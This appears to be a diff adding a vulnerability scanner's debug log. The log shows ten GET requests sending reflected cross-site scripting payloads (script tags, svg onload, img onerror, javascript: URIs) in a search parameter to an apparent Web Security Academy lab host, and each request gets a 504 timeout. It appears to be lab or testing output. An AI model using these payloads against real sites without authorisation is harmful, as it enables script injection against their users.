@@ -1,0 +1,170 @@
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<script>alert(1)</script>
+
+
+GET /?search=a98648<script>alert(1)</script> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<script>alert(1)</script>
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<svg/onload=alert(1)>
+
+
+GET /?search=a98648<svg/onload=alert(1)> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<svg/onload=alert(1)>
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<img+src=x+onerror=alert(1)>
+
+
+GET /?search=a98648<img+src=x+onerror=alert(1)> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<img+src=x+onerror=alert(1)>
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<iframe+src="javascript:alert(1)">
+
+
+GET /?search=a98648<iframe+src="javascript:alert(1)"> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<iframe+src="javascript:alert(1)">
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648"><script>alert(1)</script>
+
+
+GET /?search=a98648"><script>alert(1)</script> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648"><script>alert(1)</script>
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<IMG+SRC="javascript:alert('XSS')">
+
+
+GET /?search=a98648<IMG+SRC="javascript:alert('XSS')"> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<IMG+SRC="javascript:alert('XSS')">
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648</script><script>alert('XSS')</script>
+
+
+GET /?search=a98648</script><script>alert('XSS')</script> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648</script><script>alert('XSS')</script>
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<INPUT+type="image"+src="javascript:alert('XSS')">
+
+
+GET /?search=a98648<INPUT+type="image"+src="javascript:alert('XSS')"> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<INPUT+type="image"+src="javascript:alert('XSS')">
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<svg+xmlns="http://www.w3.org/2000/svg"><text+y="50%"+x="50%"+fill="red"+text-anchor="middle"+onload="alert(1)">XSS</text></svg>
+
+
+GET /?search=a98648<svg+xmlns="http://www.w3.org/2000/svg"><text+y="50%"+x="50%"+fill="red"+text-anchor="middle"+onload="alert(1)">XSS</text></svg> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<svg+xmlns="http://www.w3.org/2000/svg"><text+y="50%"+x="50%"+fill="red"+text-anchor="middle"+onload="alert(1)">XSS</text></svg>
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
+[wordpress-xss-get-fuzz] Dumped HTTP request for https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<script>alert(String.fromCharCode(88,83,83))</script>
+
+
+GET /?search=a98648<script>alert(String.fromCharCode(88,83,83))</script> HTTP/1.1
+Host: 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[wordpress-xss-get-fuzz] Dumped HTTP response https://0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net/?search=a98648<script>alert(String.fromCharCode(88,83,83))</script>
+
+HTTP/1.1 504 Gateway Timeout
+Connection: close
+Content-Length: 197
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (0) connecting to 0a0c000a045ffdd580f2daa200fc005b.web-security-academy.net</h1></body></html>
